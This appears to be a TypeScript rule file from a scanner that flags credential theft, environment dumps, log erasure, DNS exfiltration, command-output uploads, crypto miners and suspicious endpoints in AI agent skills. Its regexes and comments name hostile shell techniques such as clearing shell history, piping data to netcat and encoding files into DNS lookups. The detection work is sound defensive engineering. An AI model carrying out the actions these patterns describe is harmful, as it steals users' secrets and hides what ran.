import { contextualize, inQuotes } from "../core/context";
import { regionAt } from "../core/markdown";
import { patternRule, signalRule } from "../core/pattern-rule";
import type { FileRule } from "../core/rule";
import { severityRank } from "../core/severity";
import { lineText, positionAt } from "../core/text";
import type { Confidence, Severity } from "../core/types";
import {
  CREDENTIAL_CONFIG_HINT,
  CREDENTIAL_CONFIG_PATTERNS,
  concreteChatWebhook,
  credentialAlignsWith,
  hostOf,
  isDemoHost,
  PLACEHOLDER_URL_RE,
  SECRET_STORE_HINT,
  SECRET_STORE_PATTERNS,
  SUSPICIOUS_ENDPOINTS,
} from "./lists";

/** Reading credentials, dumping the environment, and the network sinks data leaves through. */

const PRIVATE_IP_RE =
  /^(?:10\.|127\.|0\.|169\.254\.|192\.168\.|172\.(?:1[6-9]|2\d|3[01])\.|100\.(?:6[4-9]|[7-9]\d|1[01]\d|12[0-7])\.|192\.0\.2\.|198\.51\.100\.|203\.0\.113\.|255\.)/;

/** One pass that rules out most files before the per-class hints run. */
const ANY_ENDPOINT_HINT = new RegExp(SUSPICIOUS_ENDPOINTS.map((c) => c.hint.source).join("|"), "i");

/** The whole URL-ish token around a match, so placeholders in its path can be seen. */
function urlAt(text: string, start: number, length: number): string {
  let from = start;
  while (from > 0 && /[^\s"'`<>()[\]{}|,]/.test(text[from - 1]!)) from -= 1;
  let to = start + length;
  while (to < text.length && /[^\s"'`<>()[\]|,]/.test(text[to]!)) to += 1;
  return text.slice(from, to);
}

/**
 * How bad an endpoint is depends on what the skill does with it. A chat webhook with its channel id
 * and token baked in sends data to the author; one built from a variable posts to a channel the
 * user configured; one with `...` in it is documentation.
 */
function grade(kind: string, severity: Severity, confidence: Confidence, url: string): { severity: Severity; confidence: Confidence } {
  const path = url.replace(/^[a-z][\w+.-]*:\/\/[^/]*/i, "");
  if (PLACEHOLDER_URL_RE.test(path) || isDemoHost(hostOf(url))) return { severity: "low", confidence: "low" };
  if (kind === "chat-webhook") {
    if (concreteChatWebhook(url)) return { severity: "high", confidence: "high" };
    if (/\$\{?\w|\{\w|%s|\+\s*\w/.test(url)) return { severity: "low", confidence: "medium" };
    return { severity: "medium", confidence: "low" };
  }
  return { severity, confidence };
}

export const credentialRules: readonly FileRule[] = [
  patternRule({
    id: "credentials/secret-store-access",
    title: "Reads keys, credential stores, or browser data",
    category: "credential-access",
    severity: "high",
    confidence: "medium",
    description:
      "References SSH keys, cloud credentials, the macOS keychain, browser password and cookie stores, crypto wallets, shell history, or an agent's own login file. A skill that reads these can steal them.",
    remediation: "Install only if the skill exists to manage exactly this credential and you expected it to touch it.",
    patterns: SECRET_STORE_PATTERNS.map((re) => new RegExp(re.source, re.flags.includes("g") ? re.flags : `${re.flags}g`)),
    lineHint: SECRET_STORE_HINT,
    // A path named in a sentence is a mention; in a command or a script it is a read.
    regions: { hidden: "raise", prose: "lower-confidence", "inline-code": "lower-confidence" },
    roles: { readme: "lower-confidence", reference: "lower-confidence" },
    ignoreMatch: (m) => /^\.ssh\/?$/i.test(m[0].trim()) && !/[~$]|home|Users/i.test(m[0]),
    adjust: (m, ctx) =>
      credentialAlignsWith(m[0], [ctx.bundle.name, ctx.bundle.dirName])
        ? { severity: "medium", message: `References ${m[0].trim()}, the credential of the service this skill is named for` }
        : undefined,
    signal: "credential-read",
    message: (m) => `References ${m[0].trim()}`,
  }),
  patternRule({
    id: "credentials/config-access",
    title: "Reads tool configs that hold tokens",
    category: "credential-access",
    severity: "medium",
    confidence: "medium",
    description:
      "References config files that commonly hold tokens or reveal infrastructure: kubeconfig, Docker auth, npm and PyPI rc files, GitHub CLI hosts, Terraform credentials, SSH client config.",
    patterns: CREDENTIAL_CONFIG_PATTERNS.map((re) => new RegExp(re.source, re.flags.includes("g") ? re.flags : `${re.flags}g`)),
    lineHint: CREDENTIAL_CONFIG_HINT,
    regions: { hidden: "raise", prose: "lower-confidence", "inline-code": "lower-confidence" },
    roles: { readme: "lower-confidence", reference: "lower-confidence" },
    adjust: (m, ctx) => (credentialAlignsWith(m[0], [ctx.bundle.name, ctx.bundle.dirName]) ? { severity: "low" } : undefined),
    message: (m) => `References ${m[0].trim()}`,
  }),
  patternRule({
    id: "credentials/token-minting",
    title: "Prints live access tokens from a CLI",
    category: "credential-access",
    severity: "medium",
    confidence: "medium",
    description:
      "Asks a logged-in CLI to print a long-lived credential (the GitHub CLI token command, secret-tool, Docker credential helpers, AWS credential export), or to mint a short-lived access token (the gcloud and az token commands), which then goes wherever the next command sends it.",
    patterns: [
      /\bgh\s+auth\s+token\b|\baws\s+configure\s+export-credentials\b|\bsecret-tool\s+lookup\b|\bdocker-credential-\w+\s+get\b|\bnpm\s+token\s+(?:list|create)\b/g,
      /\bgcloud\s+auth\s+(?:application-default\s+)?print-(?:access|identity)-token\b|\baz\s+account\s+get-access-token\b|\baws\s+sts\s+get-session-token\b/g,
    ],
    prefilter:
      /\bgh\s+auth|export-credentials|secret-tool|docker-credential|npm\s+token|print-(?:access|identity)-token|get-access-token|get-session-token/,
    // Short-lived, resource-scoped tokens are how vendors document calling their APIs; long-lived ones are the prize.
    adjust: (m) =>
      /print-(?:access|identity)-token|get-access-token|get-session-token/.test(m[0])
        ? { severity: "low", message: `Mints a short-lived access token (\`${m[0]}\`); check where the next command sends it` }
        : undefined,
    signal: (m) => (/print-(?:access|identity)-token|get-access-token|get-session-token/.test(m[0]) ? undefined : "credential-read"),
  }),
  patternRule({
    id: "credentials/env-dump",
    title: "Dumps every environment variable",
    category: "credential-access",
    severity: "medium",
    confidence: "medium",
    description:
      "Reads the whole environment at once: env or printenv piped or redirected, process.env or os.environ serialized whole. The environment usually holds API keys; a skill needs specific variables, not all of them.",
    patterns: [
      // `env | grep X` and friends pick one variable; piping or redirecting everything is the dump.
      /(?<=^|[\s;&|`])(?:env|printenv|export\s+-p)\s*(?:\|(?!\s*(?:e?grep|rg|sort|head|tail|less|more|wc|column|cut|awk|sed|jq|fzf)\b)|>(?!\s*\/dev\/null))/gm,
      /\$\(\s*(?:env|printenv)\s*\)|`\s*(?:env|printenv)\s*`/g,
      /\bJSON\.stringify\s*\(\s*process\.env\s*[,)]|\b(?:console\.log|util\.inspect)\s*\(\s*process\.env\s*\)/g,
      /\bjson\.dumps?\s*\(\s*(?:dict\s*\(\s*)?os\.environ\b|\b(?:print|str|repr)\s*\(\s*(?:dict\s*\(\s*)?os\.environ\s*\)?\s*\)|\byaml\.dump\s*\(\s*(?:dict\s*\(\s*)?os\.environ/g,
      /\/proc\/(?:self|\d+|\$\$)\/environ\b|\bGet-ChildItem\s+env:|\bgci\s+env:|\[Environment\]::GetEnvironmentVariables\(\)/gi,
    ],
    kinds: ["script", "skill-md", "markdown"],
    lineHint: /\benv\b|printenv|export\s+-p|process\.env|os\.environ|\/environ\b|env:|GetEnvironmentVariables/i,
    // Markdown tables and prose put `env` next to a pipe character far too often.
    regions: { prose: "skip", "inline-code": "skip" },
    // Backticks are command substitution in shell only; in Python or JavaScript text they are Markdown quoting.
    ignoreMatch: (m, ctx) =>
      (m[0].startsWith("`") || ctx.text[m.index - 1] === "`") && ctx.file.kind === "script" && ctx.file.language !== "shell",
    signal: "env-dump",
  }),
  patternRule({
    id: "exec/anti-forensics",
    title: "Erases shell history or logs",
    category: "privilege",
    severity: "high",
    confidence: "medium",
    description: "Disables or clears shell history or system logs, which only serves to hide what ran.",
    patterns: [
      /\bunset\s+HISTFILE\b|\bhistory\s+-c\b|\bexport\s+HISTSIZE=0\b|\bHISTFILE=\/dev\/null\b|\brm\s+(?:-\w+\s+)*~?\/?\.(?:bash|zsh)_history\b|\bClear-History\b|\bwevtutil\s+cl\b|\blog\s+erase\b/g,
    ],
  }),
];

export const networkRules: readonly FileRule[] = [
  {
    id: "network/suspicious-endpoint",
    title: "Talks to an exfiltration-prone service",
    category: "network",
    severity: "high",
    confidence: "high",
    description:
      "Contains a URL on a service that is rarely needed by a legitimate skill and commonly used to receive stolen data or relay control: public tunnels, anonymous paste and file-drop sites, request catchers, chat webhooks, Tor, dynamic DNS, URL shorteners.",
    remediation:
      "Find out why the skill needs this endpoint. A chat webhook can be legitimate for a notification skill; a request catcher or paste site almost never is.",
    scope: "file",
    kinds: ["skill-md", "markdown", "script", "manifest", "text"],
    check(ctx) {
      if (!ANY_ENDPOINT_HINT.test(ctx.text)) return;
      let n = 0;
      for (const cls of SUSPICIOUS_ENDPOINTS) {
        if (!cls.hint.test(ctx.text)) continue;
        for (const m of ctx.text.matchAll(cls.re)) {
          const url = urlAt(ctx.text, m.index, m[0].length);
          // `temp.sh` and `paste.rs` are also file names; only a URL or host reference counts.
          if (/\.(?:sh|rs)$/i.test(m[0]) && !/^[a-z][\w+.-]*:\/\/|@/i.test(url) && ctx.text[m.index + m[0].length] !== "/") continue;
          let base = grade(cls.kind, cls.severity, cls.confidence, url);
          // In code, a bare host in a string (an indicator list, a blocklist) is data until something requests it.
          if (ctx.file.kind === "script" && !/^[a-z][\w+.-]*:\/\/|^\/\//i.test(url) && severityRank(base.severity) >= severityRank("high"))
            base = { severity: "medium", confidence: base.confidence };
          const g = contextualize(ctx, m.index, m[0].length, base, { roles: { readme: "lower-severity" } });
          if (!g) continue;
          if (g.confidence !== "low" && severityRank(g.severity) >= severityRank("medium")) ctx.signal("network-send", m.index, m[0]);
          ctx.report({
            offset: m.index,
            length: m[0].length,
            severity: g.severity,
            confidence: g.confidence,
            message: `${hostOf(url) || m[0]} is ${cls.label}`,
          });
          if (++n >= 8) return;
        }
      }
    },
  },
  patternRule({
    id: "network/raw-ip-url",
    title: "URL with a raw public IP address",
    category: "network",
    severity: "medium",
    confidence: "medium",
    description:
      "Connects to a bare IP address instead of a domain. Legitimate services have names; raw IPs are typical of throwaway attacker infrastructure.",
    patterns: [/\b(?:https?|ftp|wss?|tcp):\/\/((?:\d{1,3}\.){3}\d{1,3})(?::\d{1,5})?(?:\/[^\s"'`)]*)?/gi],
    ignoreMatch: (m) => PRIVATE_IP_RE.test(m[1] ?? "") || (m[1] ?? "").split(".").some((o) => Number(o) > 255),
    signal: "network-send",
    message: (m) => `Connects to raw IP address ${m[1]}`,
  }),
  patternRule({
    id: "network/insecure-download",
    title: "Downloads over plain HTTP",
    category: "network",
    severity: "low",
    confidence: "medium",
    description: "Fetches content over unencrypted HTTP, so anyone on the network path can replace it.",
    patterns: [
      /\b(?:curl|wget|iwr|invoke-webrequest|fetch|urlopen|requests\.get|git\s+clone)\b[^\n]{0,120}?\bhttp:\/\/(?!(?:localhost|127\.0\.0\.1|0\.0\.0\.0|\[::1\]|host\.docker\.internal)[:/])[\w-]+\.[\w.-]+/gi,
      /\bgit:\/\/[\w.-]+\//g,
      /\bftp:\/\/[\w.-]+/g,
    ],
    kinds: ["script", "skill-md", "markdown", "manifest"],
  }),
  patternRule({
    id: "network/dns-exfiltration",
    title: "Encodes data into DNS lookups",
    category: "exfiltration",
    severity: "high",
    confidence: "medium",
    description:
      "Builds a hostname from a variable or command output and resolves it, a way to leak data through DNS that bypasses HTTP egress controls.",
    patterns: [
      // The query name carries the data: `dig $(cat f | base64).x.example`, `dig @ns {encoded}.x.example` in an f-string.
      /\b(?:nslookup|dig|host|drill)\s+(?:(?:-\S+|@\S+)\s+)*(?:[\w.-]*(?:\$\([^)\n]{1,80}\)|`[^`\n]{1,80}`|\$\{?[A-Za-z_]\w*\}?|\{[A-Za-z_]\w*\})){1,4}[\w.-]*\.[\w-]+\.[a-z]{2,}\b/g,
    ],
    kinds: ["script", "skill-md", "markdown"],
    regions: { prose: "skip", "inline-code": "lower-confidence" },
    signal: "network-send",
  }),
  patternRule({
    id: "network/command-output-upload",
    title: "Sends command output to a URL",
    category: "exfiltration",
    severity: "medium",
    confidence: "medium",
    description:
      "Puts the output of a command into a request: command substitution in a POST body or a URL, or a file piped into curl's standard input. Host details, file contents, and secrets leave the machine this way; the fake Vercel skill in the ToxicSkills study did exactly this.",
    remediation: "Check what the command prints and who receives it. A skill rarely needs to send local command output anywhere.",
    patterns: [
      /\b(?:curl|wget|https?|xh|Invoke-WebRequest|Invoke-RestMethod|iwr|irm)\b[^\n]{0,200}?\s(?:-d|--data(?:-binary|-raw|-urlencode|-ascii)?|-F|--form|--post-data|--body-data|-Body)[=\s]+[^\n]{0,160}?(?:\$\(\s*[\w./-]*|`[^`\n]+`)/gi,
      // In the query string: `?h=$(hostname)`. A substitution in the path picks a release asset (`.../ant_$(uname -s).tar.gz`).
      /\b(?:curl|wget)\b[^\n]{0,120}?https?:\/\/[^\s"'?]*\?[^\s"']*(?:\$\(\s*[\w./-]*|`[^`\n]+`)/gi,
      // Anything piped into curl's standard input as the request body (`... | curl -d @-`).
      /\|\s*(?:base64\s*(?:-\w+\s*)*\|\s*)?(?:curl|wget)\b[^\n]{0,160}(?:-d|--data(?:-binary|-raw)?|-F|-T|--upload-file|--post-file)\s*[=\s]?["']?@?-/gi,
    ],
    prefilter: /\b(?:curl|wget|xh|Invoke-WebRequest|Invoke-RestMethod|iwr|irm)\b[^\n]*(?:\$\(|`|@-)/i,
    kinds: ["script", "skill-md", "markdown", "manifest"],
    regions: { prose: "lower-confidence" },
    // Recon commands and secret files in the payload are the tell; a token minted for an Authorization header is how APIs work.
    ignoreMatch: (m) =>
      /(?:-H|--header)\s+["']?(?:authorization|x-api-key|api-key|private-token)\b[^\n]*\$\(/i.test(m[0]) && !/-d\b|--data|-F\b/.test(m[0]),
    adjust: (m, ctx) => {
      const line = lineText(ctx.index, positionAt(ctx.index, m.index).line);
      const sensitive =
        /\$\(\s*(?:whoami|hostname|uname|id\b|cat\s|env\b|printenv|ifconfig|ip\s+a|ls\s|pwd|curl\s|base64)|`\s*(?:whoami|hostname|uname|id\b|cat\s|env\b|printenv)/i.test(
          m[0],
        ) ||
        (m[0].startsWith("|") &&
          /(?:^|[\s;&|(])(?:cat|env|printenv|whoami|hostname|uname|id|ifconfig|find|tar|zip|sqlite3|security|done)\b/.test(
            line.slice(0, Math.max(0, line.indexOf(m[0]))),
          ));
      return sensitive ? { severity: "high" } : undefined;
    },
    signal: "network-send",
    message: () => "Sends the output of a local command in a network request",
  }),
  patternRule({
    id: "network/crypto-mining",
    title: "Cryptocurrency miner",
    category: "network",
    severity: "high",
    confidence: "high",
    description: "Mining pool protocols or known miner binaries.",
    patterns: [/\bstratum\+(?:tcp|ssl|tls):\/\/|\bxmrig\b|\bcpuminer\b|\bnicehash\b|\bminergate\b|\bcoinhive\b/gi],
    prefilter: /stratum\+|xmrig|cpuminer|nicehash|minergate|coinhive/i,
    // A pool URL is a miner's configuration wherever it appears. A miner's name in a sentence, or quoted as a
    // detection string, is a mention.
    ignoreMatch: (m, ctx) => {
      if (/^stratum/i.test(m[0])) return false;
      const region = ctx.regions ? regionAt(ctx.regions, m.index).kind : undefined;
      return region === "prose" || region === "inline-code" || inQuotes(ctx, m.index, m[0].length, true);
    },
  }),
  signalRule("signal/network", "network", [
    /\b(?:curl|wget|nc|ncat|socat|telnet|scp|rsync|sftp|ftp)\b\s+[^\n]{0,200}?(?:https?:\/\/|\w@[\w.-]+:|\b(?:\d{1,3}\.){3}\d{1,3}\b|\s[\w-]+\.[\w.-]+\s+\d{2,5}\b)/g,
    /\b(?:requests|httpx|aiohttp|urllib3?)\.(?:get|post|put|patch|request|urlopen|Session|AsyncClient|ClientSession)\b|\burlopen\s*\(|\bsocket\.(?:socket|create_connection)\b|\bhttp\.client\b|\bsmtplib\b/g,
    /\bfetch\s*\(|\baxios\b|\b(?:https?|net|tls|dgram)\.(?:request|get|connect|createConnection)\s*\(|\bnew\s+WebSocket\s*\(|\bnavigator\.sendBeacon\b|\bXMLHttpRequest\b/g,
    /\b(?:Invoke-WebRequest|Invoke-RestMethod|iwr|irm|Net\.WebClient|System\.Net\.Http)\b/gi,
  ]),
  signalRule("signal/network-send", "network-send", [
    /\bcurl\b[^\n]{0,200}?\s(?:-d|--data(?:-binary|-raw|-urlencode)?|-F|--form|-T|--upload-file)\s+["']?@?/g,
    /\bcurl\b[^\n]{0,200}?\s-X\s*(?:POST|PUT|PATCH)\b/g,
    /\bwget\b[^\n]{0,200}?--post-(?:file|data)\b/g,
    /\b(?:requests|httpx|session|client)\.(?:post|put|patch)\s*\(|\bmethod\s*:\s*["'](?:POST|PUT|PATCH)["']/g,
    /\b(?:nc|ncat|netcat)\b[^\n|]{0,80}\s<\s*\S|\|\s*(?:nc|ncat|netcat)\s+[\w.-]+\s+\d{2,5}\b/g,
    /\bscp\s+[^\n]{0,200}\s[\w.-]+@[\w.-]+:|\brsync\s+[^\n]{0,200}\s[\w.-]+@[\w.-]+:/g,
    /\bsmtplib\.SMTP|\bsendmail\b|\bmail\s+-s\b/g,
  ]),
];
